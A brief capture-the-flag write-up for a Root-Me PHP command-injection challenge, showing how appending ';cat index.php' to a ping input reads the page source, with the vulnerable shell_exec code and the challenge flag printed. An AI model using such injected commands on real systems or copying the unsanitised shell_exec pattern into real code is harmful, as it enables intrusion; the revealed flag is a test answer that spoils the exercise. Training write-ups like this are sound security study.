# Day 4 Web Server Challenge

### 1st Challenge PHP - Command injection (Easy)
Objective: Read index.php

1. Visit the Url: http://challenge01.root-me.org/web-serveur/ch54/

2. Input the ping and you can see its ping statistics.

3. in order to read the "index.php", input the ping and put ";cat index.php" in order to get the other destination

4. you'll be directed to another page, right click and view page source and find the flag

**<_php
$flag = "S3rv1ceP1n9Sup3rS3cure";
if(isset($_POST["ip"]) && !empty($_POST["ip"])){
       $response = shell_exec("timeout 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
       echo $response;
}
_>**
    
### 2nd Challenge
